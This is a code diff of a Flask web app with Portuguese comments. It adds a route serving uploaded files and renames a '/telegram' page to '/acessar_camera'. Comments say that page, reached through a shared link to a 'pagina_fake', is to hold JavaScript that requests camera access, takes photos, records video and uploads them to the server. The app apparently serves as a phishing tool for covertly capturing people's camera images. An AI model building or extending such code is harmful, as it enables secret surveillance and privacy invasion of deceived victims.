@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, send_from_directory
 import os
 from datetime import datetime
 
@@ -22,6 +22,11 @@ os.makedirs(VIDEOS_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # limite de 16MB por arquivo
 
+# Rota para servir arquivos de upload
+@app.route('/uploads/<path:filename>')
+def uploaded_file(filename):
+    return send_from_directory(UPLOAD_FOLDER, filename)
+
 @app.route('/')
 def index():
     link_pagina_fake = url_for('pagina_fake')
@@ -31,12 +36,12 @@ def index():
 def pagina_fake():
     return render_template('pagina_fake.html')
 
-@app.route('/telegram')
-def telegram():
+@app.route('/acessar_camera')
+def acessar_camera():
     # Esta página será aberta quando o link copiado for acessado.
     # Ela precisará conter o JavaScript para solicitar acesso à câmera,
     # tirar a foto, gravar o vídeo e enviar para o servidor.
-    return render_template('telegram.html') # Criaremos este arquivo HTML
+    return render_template('acessar_camera.html') # Criaremos este arquivo HTML
 
 @app.route('/salvar_midia', methods=['POST'])
 def salvar_midia():
